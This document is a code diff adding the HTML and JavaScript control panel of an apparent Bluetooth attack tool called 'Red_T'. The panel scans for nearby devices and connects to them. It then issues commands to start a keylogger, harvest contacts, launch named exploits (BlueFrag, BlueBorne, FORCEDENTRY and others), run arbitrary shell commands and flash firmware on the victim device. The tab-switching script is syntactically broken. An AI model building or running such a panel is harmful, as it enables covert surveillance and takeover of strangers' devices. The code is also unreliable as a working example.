@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red_T Bluetooth Control</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #121212;
+            color: #e0e0e0;
+        }
+        .container {
+            display: flex;
+            min-height: 100vh;
+        }
+        .sidebar {
+            width: 300px;
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-right: 1px solid #333;
+        }
+        .main-content {
+            flex: 1;
+            padding: 20px;
+        }
+        .device-list {
+            margin-top: 20px;
+        }
+        .device-card {
+            background-color: #252525;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .device-card:hover {
+            background-color: #333;
+        }
+        .device-card.active {
+            background-color: #004080;
+        }
+        .device-name {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .device-address {
+            font-family: monospace;
+            color: #aaa;
+            font-size: 0.9em;
+        }
+        .control-panel {
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .command-panel {
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        button:hover {
+            background-color: #0052a3;
+        }
+        button.danger {
+            background-color: #cc0000;
+        }
+        button.danger:hover {
+            background-color: #a30000;
+        }
+        select, input {
+            background-color: #333;
+            color: white;
+            border: 1px solid #444;
+            padding: 8px;
+            border-radius: 4px;
+            margin-right: 10px;
+        }
+        .log-container {
+            margin-top: 20px;
+            background-color: #1e1e1e;
+            padding: 15px;
+            border-radius: 5px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+        .status-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: #0066cc;
+            padding: 5px 20px;
+            font-size: 0.9em;
+        }
+        .tab-container {
+            display: flex;
+            margin-bottom: 15px;
+        }
+        .tab {
+            padding: 10px 20px;
+            background-color: #252525;
+            margin-right: 5px;
+            border-radius: 5px 5px 0 0;
+            cursor: pointer;
+        }
+        .tab.active {
+            background-color: #1e1e1e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="sidebar">
+            <h2>Red_T Control</h2>
+            <div>
+                <button id="startScan">Start Scan</button>
+                <button id="stopScan" class="danger">Stop Scan</button>
+            </div>
+            <div class="device-list" id="deviceList">
+                <!-- Devices will be populated here -->
+            </div>
+        </div>
+        <div class="main-content">
+            <div class="control-panel">
+                <h3>Device Control</h3>
+                <div id="deviceInfo">
+                    <p>No device selected</p>
+                </div>
+                <div id="connectionControls" style="display: none;">
+                    <button id="connectBtn">Connect</button>
+                    <button id="disconnectBtn" class="danger" style="display: none;">Disconnect</button>
+                    <select id="platformSelect">
+                        <option value="auto">Auto Detect</option>
+                        <option value="android">Android</option>
+                        <option value="ios">iOS</option>
+                        <option value="windows">Windows</option>
+                        <option value="linux">Linux</option>
+                    </select>
+                </div>
+            </div>
+            
+            <div class="command-panel">
+                <div class="tab-container">
+                    <div class="tab active" data-tab="basic">Basic</div>
+                    <div class="tab" data-tab="exploits">Exploits</div>
+                    <div class="tab" data-tab="advanced">Advanced</div>
+                </div>
+                
+                <div id="basicTab" class="tab-content">
+                    <h4>Basic Commands</h4>
+                    <div>
+                        <button class="command-btn" data-command="open_app" data-args='["com.android.chrome"]'>Open Browser</button>
+                        <button class="command-btn" data-command="open_app" data-args='["com.android.messaging"]'>Open Messages</button>
+                        <button class="command-btn" data-command="get_contacts">Get Contacts</button>
+                        <button class="command-btn" data-command="start_keylogger">Start Keylogger</button>
+                        <button class="command-btn" data-command="stop_keylogger">Stop Keylogger</button>
+                        <button class="command-btn" data-command="get_keylog">Get Keylog</button>
+                    </div>
+                </div>
+                
+                <div id="exploitsTab" class="tab-content" style="display: none;">
+                    <h4>Exploits</h4>
+                    <div>
+                        <button class="command-btn" data-command="exploit_bluefrag">BlueFrag (Android)</button>
+                        <button class="command-btn" data-command="exploit_bleak_tooth">BLEAK_TOOTH (iOS)</button>
+                        <button class="command-btn" data-command="exploit_blueborne">BlueBorne (Windows)</button>
+                        <button class="command-btn" data-command="exploit_bluez">BlueZ (Linux)</button>
+                        <button class="command-btn" data-command="zero_click_exploit" data-args='["FORCEDENTRY"]'>FORCEDENTRY (Zero-Click)</button>
+                    </div>
+                </div>
+                
+                <div id="advancedTab" class="tab-content" style="display: none;">
+                    <h4>Advanced</h4>
+                    <div>
+                        <input type="text" id="shellCommand" placeholder="Enter shell command">
+                        <button class="command-btn" data-command="shell">Execute</button>
+                        <input type="text" id="firmwarePath" placeholder="Firmware path">
+                        <button class="command-btn" data-command="flash_firmware">Flash Firmware</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="log-container" id="logOutput">
+                <p>System logs will appear here...</p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="status-bar" id="statusBar">
+        Ready
+    </div>
+    
+    <script>
+        const socket = io();
+        let selectedDevice = null;
+        let isConnected = false;
+        
+        // DOM elements
+        const deviceList = document.getElementById('deviceList');
+        const deviceInfo = document.getElementById('deviceInfo');
+        const connectionControls = document.getElementById('connectionControls');
+        const connectBtn = document.getElementById('connectBtn');
+        const disconnectBtn = document.getElementById('disconnectBtn');
+        const platformSelect = document.getElementById('platformSelect');
+        const logOutput = document.getElementById('logOutput');
+        const statusBar = document.getElementById('statusBar');
+        const startScanBtn = document.getElementById('startScan');
+        const stopScanBtn = document.getElementById('stopScan');
+        
+        // Tab switching
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none'));
+                
+                tab.classList.add('active');
+                const tabName = tab.getAttribute('data-tab');
+                document.getElementById(`${tabName}Tab`).style.display = 'block';
+            });
+        
+        
+        // Socket.io event handlers
+        socket.on('connect', () => {
+            logMessage('Connected to Red_T server');
+            updateStatus('Connected to server');
+        });
+        
+        socket.on('disconnect', () => {
+            logMessage('Disconnected from server');
+            updateStatus('Disconnected');
+        });
+        
+        socket.on('scan_results', (data) => {
+            updateStatus(`Scanning - ${data.count} devices found`);
+            updateDeviceList(data.devices);
+        });
+        
+        socket.on('scan_error', (data) => {
+            logMessage(`Scan error: ${data.message}`, 'error');
+            updateStatus('Scan error');
+        });
+        
+        socket.on('command_response', (data) => {
+            logMessage(`Command response: ${JSON.stringify(data)}`, 'info');
+        });
+        
+        // Button event handlers
+        startScanBtn.addEventListener('click', () => {
+            fetch('/api/start_scan', { method: 'POST' })
+                .then(response => response.json())
+                .then(data => {
+                    logMessage(data.message, data.status);
+                });
+        });
+        
+        stopScanBtn.addEventListener('click', () => {
+            fetch('/api/stop_scan', { method: 'POST' })
+                .then(response => response.json())
+                .then(data => {
+                    logMessage(data.message, data.status);
+                });
+        });
+        
+        connectBtn.addEventListener('click', () => {
+            if (!selectedDevice) return;
+            
+            const platform = platformSelect.value;
+            
+            fetch('/api/connect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    address: selectedDevice,
+                    platform: platform === 'auto' ? null : platform
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                logMessage(data.message, data.status);
+                if (data.status === 'success') {
+                    isConnected = true;
+                    connectBtn.style.display = 'none';
+                    disconnectBtn.style.display = 'inline-block';
+                    updateDeviceInfo(selectedDevice, true);
+                }
+            });
+        });
+        
+        disconnectBtn.addEventListener('click', () => {
+            if (!selectedDevice) return;
+            
+            fetch('/api/disconnect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: selectedDevice })
+            })
+            .then(response => response.json())
+            .then(data => {
+                logMessage(data.message, data.status);
+                if (data.status === 'success') {
+                    isConnected = false;
+                    connectBtn.style.display = 'inline-block';
+                    disconnectBtn.style.display = 'none';
+                    updateDeviceInfo(selectedDevice, false);
+                }
+            });
+        });
+        
+        // Command buttons
+        document.querySelectorAll('.command-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                if (!selectedDevice || !isConnected) {
+                    logMessage('No device connected', 'error');
+                    return;
+                }
+                
+                const command = btn.getAttribute('data-command');
+                let args = btn.getAttribute('data-args');
+                
+                // Handle special cases
+                if (command === 'shell') {
+                    args = [document.getElementById('shellCommand').value];
+                } else if (command === 'flash_firmware') {
+                    args = [document.getElementById('firmwarePath').value];
+                } else if (args) {
+                    args = JSON.parse(args);
+                } else {
+                    args = [];
+                }
+                
+                fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        address: selectedDevice,
+                        command: command,
+                        args: args
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    logMessage(`Command ${command} result: ${JSON.stringify(data.result)}`, data.status);
+                });
+            });
+        });
+        
+        // Helper functions
+        function updateDeviceList(devices) {
+            deviceList.innerHTML = '';
+            
+            for (const [address, info] of Object.entries(devices)) {
+                const deviceCard = document.createElement('div');
+                deviceCard.className = 'device-card';
+                if (address === selectedDevice) {
+                    deviceCard.classList.add('active');
+                }
+                
+                deviceCard.innerHTML = `
+                    <div class="device-name">${info.name || 'Unknown Device'}</div>
+                    <div class="device-address">${address}</div>
+                    <div>Type: ${info.type} | RSSI: ${info.rssi || 'N/A'}</div>
+                `;
+                
+                deviceCard.addEventListener('click', () => {
+                    selectedDevice = address;
+                    updateDeviceInfo(address, isConnected);
+                    document.querySelectorAll('.device-card').forEach(card => {
+                        card.classList.remove('active');
+                    });
+                    deviceCard.classList.add('active');
+                });
+                
+                deviceList.appendChild(deviceCard);
+            }
+        }
+        
+        function updateDeviceInfo(address, connected) {
+            connectionControls.style.display = 'block';
+            disconnectBtn.style.display = connected ? 'inline-block' : 'none';
+            connectBtn.style.display = connected ? 'none' : 'inline-block';
+            
+            // In a real implementation, we'd show more device info
+            deviceInfo.innerHTML = `
+                <h4>${address}</h4>
+                <p>Status: ${connected ? 'Connected' : 'Disconnected'}</p>
+            `;
+        }
+        
+        function logMessage(message, type = 'info') {
+            const logEntry = document.createElement('p');
+            logEntry.textContent = message;
+            
+            switch (type) {
+                case 'error':
+                    logEntry.style.color = '#ff6b6b';
+                    break;
+                case 'success':
+                    logEntry.style.color = '#6bff6b';
+                    break;
+                case 'warning':
+                    logEntry.style.color = '#ffd166';
+                    break;
+                default:
+                    logEntry.style.color = '#e0e0e0';
+            }
+            
+            logOutput.appendChild(logEntry);
+            logOutput.scrollTop = logOutput.scrollHeight;
+        }
+        
+        function updateStatus(message) {
+            statusBar.textContent = message;
+        }
+    </script>
+</body>
+</html>
